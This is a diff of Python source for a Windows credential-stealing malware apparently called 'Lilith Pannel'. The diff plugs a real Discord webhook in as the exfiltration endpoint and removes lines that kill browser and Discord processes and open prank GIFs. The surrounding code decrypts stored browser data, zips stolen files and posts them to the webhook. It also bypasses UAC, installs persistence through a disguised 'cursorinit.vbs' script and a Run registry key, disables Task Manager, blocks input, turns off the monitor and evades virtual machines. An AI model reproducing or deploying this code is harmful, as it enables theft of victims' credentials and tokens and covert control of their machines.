@@ -2,16 +2,14 @@ import os,json,shutil,keyboard,base64,sqlite3,zipfile,requests,subprocess,psutil
 import winreg
 import pyautogui
 import numpy as np
-
 from time import sleep
 from threading import Thread
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
-
 config = {
-    'webhook': webhookhere,
+    'webhook': "https://discordapp.com/api/webhooks/1166492498219257926/MglE53sDpx9Mjg_0WlbtVryYaU6-kPwGrn181Eu62sJp0jv9dkKN4FHNQ5mKyIdaA_em",
     'persist': True,
     'keep-alive': False,  
     'hideconsole': True, 
@@ -22,13 +20,6 @@ config = {
     'error_message': 'Failed to Start Lilith Pannel\nPlease note if this keeps happening you do not have The API or strg08.DLL\n',
 }
 class functions(object):
-    os.system("taskkill /f /im discord.exe")
-    os.system("taskkill /f /im explorer.exe")
-    os.system("taskkill /f /im chrome.exe")
-    os.system("taskkill /f /im msedge.exe")
-    os.startfile("https://giphy.com/gifs/gay-kiss-gaykiss-gif-7Q1wLNtFRUWsw/fullscreen")
-    os.startfile("https://giphy.com/gifs/gay-kiss-gaykiss-gif-7Q1wLNtFRUWsw/fullscreen")
-    os.startfile("https://giphy.com/gifs/gay-kiss-gaykiss-gif-7Q1wLNtFRUWsw/fullscreen")
     def getHeaders(self, token:str=None, content_type="application/json") -> dict:
         headers = {"Content-Type": content_type, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
         if token: headers.update({"Authorization": token})
@@ -670,8 +661,6 @@ Antivirus: {avlist}
                 a.update({"content": f"{link}"})
                 requests.post(self.webhook, json=a)
         os.remove(_zipfile)
-        
-
     def forceadmin(self):
         self.system(f'set __COMPAT_LAYER=RunAsInvoker && powershell Start-Process \'{sys.argv[0]}\' -WindowStyle Hidden -verb runAs -ArgumentList \'--nouacbypass\'>nul')
         sys.exit()
@@ -706,9 +695,6 @@ Antivirus: {avlist}
                 with open(os.path.join(self.roaming,'Cursors\\cursorinit.vbs'),'w') as f: f.write(f'\' This script loads the cursor configuration\n\' And cursors themselves\n\' Into the shell so that Fondrvhost.exe (The font renderer)\n\' Can use them.\n\' It is recommended not to tamper with\n\' Any files in this directory\n\' Doing so may cause the explorer to crash\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c \'{os.path.join(self.roaming,binp)}\'\", 0, True\n')
                 self.system(f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "CursorInit" /t REG_SZ /d "{os.path.join(self.roaming,initp)}" /f >nul')
             except Exception: self.exceptions.append(traceback.format_exc())
-
-
-
 def handler():
     try: ticks(0x0000000000F)
     except Exception: pass
@@ -723,7 +709,6 @@ def distskmngr(self):
     try: self.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
     except:
         pass
-
 def displayof():
     import ctypes
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -734,7 +719,6 @@ def displayof():
         SC_MONITORPOWER = 61808
         ctypes.windll.user32.BlockInput(True)
         ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
-
 def stabilizeTicks():
     if config['antivm']:
         if os.path.exists('D:\\Tools') or os.path.exists('D:\\OS2') or os.path.exists('D:\\NT3X'): return
@@ -747,9 +731,5 @@ def stabilizeTicks():
     if config['hideconsole']: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     try: handler()
     except Exception: pass
-
 ticks.starttime = time.time()
-
-
 if __name__ == "__main__": stabilizeTicks()
-
